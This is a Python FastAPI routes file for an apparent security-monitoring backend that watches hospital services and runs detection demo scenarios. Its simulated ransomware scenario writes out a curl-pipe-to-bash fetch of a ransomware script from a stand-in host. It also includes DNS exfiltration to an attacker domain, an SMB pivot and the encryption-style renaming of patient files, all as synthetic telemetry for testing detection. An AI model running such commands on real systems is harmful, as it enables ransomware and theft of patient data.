"""
SentinelCloud API Routes
=========================
Organized REST API endpoints. All routes prefixed with /api.
"""

import logging
from datetime import datetime, timezone
from typing import Optional

import httpx
from fastapi import APIRouter, Depends, HTTPException, Header
from pydantic import BaseModel

from backend.config import settings
from backend.auth.service import auth_service, LoginRequest, LoginResponse, TokenVerifyResponse
from backend.core.event_schema import (
    TelemetryEvent, TelemetrySource, DataMode,
    Severity, SystemHealthStatus, ComponentHealth,
    ServiceStatus, ServiceInfo,
)
from backend.pipeline.processor import pipeline

logger = logging.getLogger("sentinel.api")


# ── Auth dependency ──

async def get_current_user(authorization: Optional[str] = Header(None)):
    """Extract and verify JWT from Authorization header."""
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing or invalid Authorization header")
    token = authorization.replace("Bearer ", "")
    payload = auth_service.verify_token(token)
    if not payload:
        raise HTTPException(status_code=401, detail="Invalid or expired token")
    return payload


# ── Auth Router ──

auth_router = APIRouter(prefix="/api/auth", tags=["auth"])


@auth_router.post("/login", response_model=LoginResponse)
async def login(req: LoginRequest):
    """Authenticate and receive JWT token."""
    result = auth_service.login(req)
    if not result.authenticated:
        raise HTTPException(status_code=401, detail=result.message)
    return result


@auth_router.get("/verify", response_model=TokenVerifyResponse)
async def verify(user=Depends(get_current_user)):
    """Verify current token."""
    return TokenVerifyResponse(
        authenticated=True,
        role=user.role,
        username=user.sub,
    )


# ── Health Router ──

health_router = APIRouter(prefix="/api", tags=["health"])


@health_router.get("/health")
async def health():
    """Backend health check (unauthenticated)."""
    return {
        "service": "sentinel-backend",
        "status": "healthy",
        "mode": settings.mode.value,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


@health_router.get("/system-health")
async def system_health(user=Depends(get_current_user)):
    """Check health of all SentinelCloud infrastructure components."""
    status = SystemHealthStatus(mode=settings.mode.value)
    status.backend = ComponentHealth.ONLINE

    # Check medical services
    async with httpx.AsyncClient(timeout=3.0) as client:
        for svc_name, url in [
            ("vitals", settings.vitals_url),
            ("drug_dispenser", settings.drug_dispenser_url),
            ("ehr", settings.ehr_url),
            ("billing", settings.billing_url),
        ]:
            try:
                resp = await client.get(f"{url}/health")
                if resp.status_code == 200:
                    setattr(status, svc_name, ComponentHealth.ONLINE)
                else:
                    setattr(status, svc_name, ComponentHealth.DEGRADED)
            except Exception:
                setattr(status, svc_name, ComponentHealth.OFFLINE)

        # Check intelligence services
        if settings.detector_enabled:
            try:
                resp = await client.get(f"{settings.anomaly_detector_url}/health")
                status.anomaly_detector = ComponentHealth.ONLINE if resp.status_code == 200 else ComponentHealth.DEGRADED
            except Exception:
                status.anomaly_detector = ComponentHealth.OFFLINE

        try:
            resp = await client.get(f"{settings.diagnosis_service_url}/health")
            status.diagnosis_service = ComponentHealth.ONLINE if resp.status_code == 200 else ComponentHealth.DEGRADED
        except Exception:
            status.diagnosis_service = ComponentHealth.OFFLINE

    # Kafka
    if settings.kafka_enabled:
        try:
            from kafka import KafkaConsumer
            consumer = KafkaConsumer(bootstrap_servers=settings.kafka_bootstrap)
            consumer.close()
            status.kafka = ComponentHealth.ONLINE
        except Exception:
            status.kafka = ComponentHealth.OFFLINE
    else:
        status.kafka = ComponentHealth.OFFLINE

    # ClickHouse
    if settings.clickhouse_enabled:
        try:
            from clickhouse_driver import Client as CHClient
            ch = CHClient(host=settings.clickhouse_host, port=settings.clickhouse_port)
            ch.execute("SELECT 1")
            status.clickhouse = ComponentHealth.ONLINE
        except Exception:
            status.clickhouse = ComponentHealth.OFFLINE
    else:
        status.clickhouse = ComponentHealth.OFFLINE

    return status


# ── State Router ──

state_router = APIRouter(prefix="/api", tags=["state"])


@state_router.get("/state")
async def get_state(user=Depends(get_current_user)):
    """Full state snapshot for frontend hydration."""
    return pipeline.get_state_snapshot()


# ── Telemetry Router ──

telemetry_router = APIRouter(prefix="/api/telemetry", tags=["telemetry"])


class IngestEventRequest(BaseModel):
    """External event ingestion."""
    pod_name: str
    namespace: str = "medical"
    syscall_name: str = ""
    binary: str = ""
    target: str = ""
    port: int = 0
    protocol: str = ""
    payload_size: int = 0
    source: str = "http"
    params: dict = {}


@telemetry_router.post("/ingest")
async def ingest_event(req: IngestEventRequest, user=Depends(get_current_user)):
    """Ingest a single telemetry event into the pipeline with verified provenance."""
    src = TelemetrySource.HTTP_INGESTION
    if req.source in [s.value for s in TelemetrySource]:
        src = TelemetrySource(req.source)

    if req.source == "replay":
        data_mode = DataMode.REPLAY
    elif req.source == "lab_test":
        data_mode = DataMode.LAB_TEST
    elif settings.is_live and req.source in ("tetragon", "ebpf_probe", "falco"):
        data_mode = DataMode.LIVE
    else:
        data_mode = DataMode.LAB_TEST

    event = TelemetryEvent(
        source=src,
        data_mode=data_mode,
        pod_name=req.pod_name,
        namespace=req.namespace,
        syscall_name=req.syscall_name,
        binary=req.binary,
        target=req.target,
        port=req.port,
        protocol=req.protocol,
        payload_size=req.payload_size,
        params=req.params,
    )
    detection = pipeline.process_event(event)
    return {
        "event_id": event.event_id,
        "anomaly_score": detection.anomaly_score,
        "is_anomaly": detection.is_anomaly,
        "explanation": detection.explanation,
        "source": src.value,
        "data_mode": data_mode.value,
    }


@telemetry_router.get("/recent")
async def get_recent_events(
    limit: int = 50,
    pod: Optional[str] = None,
    user=Depends(get_current_user),
):
    """Get recent telemetry events, optionally filtered by pod."""
    events = list(pipeline.events)
    if pod:
        events = [e for e in events if e.pod_name == pod]
    return {"events": [e.model_dump() for e in events[-limit:]]}


@telemetry_router.get("/dataset-info")
async def get_dataset_info():
    """Retrieve provenance metadata, source citations, and coverage for the internal traffic benchmark dataset."""
    from backend.pipeline.live_traffic_generator import LiveTrafficGenerator
    return LiveTrafficGenerator.get_dataset_metadata()


# ── Detection Router ──

detection_router = APIRouter(prefix="/api/detection", tags=["detection"])


@detection_router.get("/status")
async def detection_status(user=Depends(get_current_user)):
    """ML model status and statistics."""
    return pipeline.detector.status


@detection_router.get("/recent")
async def recent_detections(limit: int = 50, user=Depends(get_current_user)):
    """Recent detection results."""
    return {"detections": [d.model_dump() for d in list(pipeline.detections)[-limit:]]}


@detection_router.get("/active")
async def get_active_threats(user=Depends(get_current_user)):
    """Currently active unmitigated threats (cleared once pod is restored to healthy)."""
    active = []
    for pod_name, threat in list(pipeline.active_threats.items()):
        svc = pipeline.services.get(pod_name)
        if svc and svc.status != ServiceStatus.HEALTHY:
            active.append(threat)
        else:
            pipeline.active_threats.pop(pod_name, None)
    return {"active_threats": active}


# ── Incident Router ──

incident_router = APIRouter(prefix="/api/incidents", tags=["incidents"])


@incident_router.get("")
@incident_router.get("/")
async def list_incidents(
    limit: int = 50,
    resolved: Optional[bool] = None,
    user=Depends(get_current_user),
):
    """List incidents."""
    incidents = list(pipeline.incidents.values())
    if resolved is not None:
        incidents = [i for i in incidents if i.resolved == resolved]
    incidents = sorted(incidents, key=lambda i: i.created_at, reverse=True)[:limit]
    return {"incidents": [i.model_dump() for i in incidents]}


@incident_router.get("/{incident_id}")
async def get_incident(incident_id: str, user=Depends(get_current_user)):
    """Get incident detail with full timeline."""
    incident = pipeline.incidents.get(incident_id)
    if not incident:
        raise HTTPException(status_code=404, detail=f"Incident {incident_id} not found")
    return incident.model_dump()


# ── Services Router ──

services_router = APIRouter(prefix="/api/services", tags=["services"])


@services_router.get("")
@services_router.get("/")
async def list_services(user=Depends(get_current_user)):
    """List all medical services with real status."""
    # Attempt live health checks
    async with httpx.AsyncClient(timeout=3.0) as client:
        for svc_name, info in pipeline.services.items():
            url_map = {
                "vitals": settings.vitals_url,
                "drug-dispenser": settings.drug_dispenser_url,
                "ehr": settings.ehr_url,
                "billing": settings.billing_url,
            }
            url = url_map.get(svc_name)
            if url:
                try:
                    resp = await client.get(f"{url}/health")
                    if resp.status_code == 200:
                        data = resp.json()
                        if info.status not in (ServiceStatus.DEGRADED, ServiceStatus.QUARANTINED, ServiceStatus.REDEPLOYING):
                            info.status = ServiceStatus.HEALTHY
                        info.uptime_seconds = data.get("uptime_seconds")
                        info.health_checked_at = datetime.now(timezone.utc)
                    else:
                        info.status = ServiceStatus.DEGRADED
                except Exception:
                    info.status = ServiceStatus.OFFLINE

    return {
        "services": {k: v.model_dump() for k, v in pipeline.services.items()},
        "mode": settings.mode.value,
    }




# ── Metrics Router ──

metrics_router = APIRouter(prefix="/api/metrics", tags=["metrics"])


@metrics_router.get("")
@metrics_router.get("/")
async def get_metrics(user=Depends(get_current_user)):
    """Real metrics computed from actual data — no fabrication."""
    return pipeline.get_metrics()


# ── Audit Router ──

audit_router = APIRouter(prefix="/api/audit", tags=["audit"])


@audit_router.get("/trail")
async def audit_trail(limit: int = 100, user=Depends(get_current_user)):
    """Immutable audit trail."""
    return {
        "records": [r.model_dump() for r in list(pipeline.audit_log)[-limit:]],
        "total": len(pipeline.audit_log),
    }


# ── Lab Test Router ──

lab_router = APIRouter(prefix="/api/lab", tags=["lab"])

_lab_sessions = []


class LabTestRequest(BaseModel):
    """Create a lab test session."""
    scenario: str  # ransomware, recon, shell_exec, etc.
    target_pod: Optional[str] = "ehr"
    target_namespace: str = "medical"
    target: Optional[str] = None
    safety_profile: str = "standard"


class LabTestResultRequest(BaseModel):
    session_id: str
    success: bool
    details: dict = {}


@lab_router.post("/test")
async def create_lab_test(req: LabTestRequest, user=Depends(get_current_user)):
    """Create and register a lab test session."""
    from backend.core.event_schema import TestSession

    tgt = req.target or f"{req.target_namespace}/{req.target_pod or 'ehr'}"
    session = TestSession(
        scenario=req.scenario,
        target=tgt,
        status="running",
        safety_profile=req.safety_profile,
    )
    _lab_sessions.append(session)
    try:
        sqlite_store.save_test_session(session)
    except Exception as e:
        logger.warning("Could not persist test session to SQLite: %s", e)
    return session.model_dump()


@lab_router.post("/result")
async def report_lab_test_result(req: LabTestResultRequest, user=Depends(get_current_user)):
    """Record lab test execution result."""
    for s in _lab_sessions:
        if s.session_id == req.session_id:
            s.status = "completed" if req.success else "failed"
            break
    try:
        sqlite_store.update_test_session(
            req.session_id,
            "completed" if req.success else "failed",
            req.details
        )
    except Exception as e:
        logger.warning("Could not update test session in SQLite: %s", e)
    return {"status": "recorded", "session_id": req.session_id}


@lab_router.get("")
@lab_router.get("/sessions")
async def list_lab_sessions(user=Depends(get_current_user)):
    """List recent lab test sessions."""
    try:
        db_sessions = sqlite_store.get_test_sessions(limit=50)
        if db_sessions:
            return db_sessions
    except Exception:
        pass
    return [s.model_dump() for s in _lab_sessions[-50:]]


# ── Scenarios Router ──

scenarios_router = APIRouter(prefix="/api/scenarios", tags=["scenarios"])


class ScenarioQueryRequest(BaseModel):
    pod_name: str = "ehr"


@scenarios_router.post("/clinician-query")
async def run_clinician_query(req: ScenarioQueryRequest = ScenarioQueryRequest(), user=Depends(get_current_user)):
    """
    Scenario A: Normal Clinician Query (Score: ~0.02 — No Alert).
    Doctor requests a patient's medical history through the web interface.
    """
    event = TelemetryEvent(
        source=TelemetrySource.HTTP_INGESTION,
        data_mode=DataMode.LIVE if settings.is_live else DataMode.LAB_TEST,
        pod_name=req.pod_name,
        namespace="medical",
        syscall_name="sys_read",
        binary="/usr/local/bin/gunicorn",
        target="/data/patient_records.json",
        port=0,
        protocol="",
        payload_size=0,
        params={"query": "SELECT * FROM patient_records WHERE id='PT-8941'", "actor": "dr_evans@hospital.local"},
    )
    detection = pipeline.process_event(event)
    svc = pipeline.services.get(req.pod_name)
    return {
        "scenario": "Scenario A: Normal Clinician Query",
        "pod_name": req.pod_name,
        "syscall_name": event.syscall_name,
        "binary": event.binary,
        "target": event.target,
        "anomaly_score": detection.anomaly_score,
        "is_anomaly": detection.is_anomaly,
        "status": svc.status.value if svc else "healthy",
        "message": "Clinician query processed. Behavioral patterns conform to normal baseline distribution. Service remains HEALTHY.",
    }


@scenarios_router.post("/ransomware")
async def run_ransomware_scenario(req: ScenarioQueryRequest = ScenarioQueryRequest(), user=Depends(get_current_user)):
    """
    Scenario B: Ransomware Execution (Score: ~0.98 — Incident Triggered!).
    Executes multi-stage cyber-attack:
    Stage 1: /bin/bash sys_execve
    Stage 2: /bin/mv sys_rename -> .locked (3.0x multiplier)
    Stage 3: /usr/bin/smbclient sys_connect -> billing:445 (2.5x multiplier)
    Stage 4: /usr/bin/dig sys_sendto -> records-exfil.attacker.net
    """
    import asyncio
    pod = req.pod_name

    async def execute_stages():
        # Stage 1: Spawn shell
        ev1 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name=pod,
            namespace="medical",
            syscall_name="sys_execve",
            binary="/bin/bash",
            target="",
            params={"argv": ["/bin/bash", "-c", "curl http://malicious.example.com/ransomware.sh | bash"]},
        )
        pipeline.process_event(ev1)
        await asyncio.sleep(1.2)

        # Stage 2: Encrypt database records with .locked
        ev2 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name=pod,
            namespace="medical",
            syscall_name="sys_rename",
            binary="/bin/mv",
            target="/data/patient_records.db.locked",
            params={"old_path": "/data/patient_records.db", "new_path": "/data/patient_records.db.locked"},
        )
        pipeline.process_event(ev2)
        await asyncio.sleep(1.2)

        # Stage 3: Lateral pivot to billing:445 SMB
        ev3 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name=pod,
            namespace="medical",
            syscall_name="sys_connect",
            binary="/usr/bin/smbclient",
            target="billing:445",
            port=445,
            protocol="tcp",
            params={"share": "C$"},
        )
        pipeline.process_event(ev3)
        await asyncio.sleep(1.2)

        # Stage 4: DNS Exfiltration
        ev4 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name=pod,
            namespace="medical",
            syscall_name="sys_sendto",
            binary="/usr/bin/dig",
            target="records-exfil.attacker.net",
            port=53,
            protocol="udp",
            params={"query": "exfil-chunk-1.records-exfil.attacker.net"},
        )
        pipeline.process_event(ev4)

    asyncio.create_task(execute_stages())

    return {
        "scenario": "Scenario B: Ransomware Execution",
        "pod_name": pod,
        "status": "launched",
        "stages": [
            "1. Spawn unauthorized command shell (/bin/bash · sys_execve)",
            "2. Rename patient files with .locked extension (/bin/mv · sys_rename · 3.0x multiplier)",
            "3. Lateral pivot attempt to billing:445 (smbclient · sys_connect · 2.5x multiplier)",
            "4. DNS exfiltration via UDP:53 (/usr/bin/dig · sys_sendto)",
        ],
        "message": f"Multi-stage attack initiated against {pod}. MAPE-K autonomic response loop will isolate and remediate.",
    }


@scenarios_router.post("/reset")
async def reset_scenarios(user=Depends(get_current_user)):
    """Reset all services to clean baseline state."""
    pipeline.active_threats.clear()
    pipeline.services = pipeline._init_services()
    if pipeline._on_service_update:
        for name, svc in pipeline.services.items():
            pipeline._on_service_update(name, svc)
    return {"status": "reset", "message": "All medical services reset to clean baseline monitoring state."}


# ── Collect all routers ──

all_routers = [
    auth_router,
    health_router,
    state_router,
    telemetry_router,
    detection_router,
    incident_router,
    services_router,
    metrics_router,
    audit_router,
    lab_router,
    scenarios_router,
]
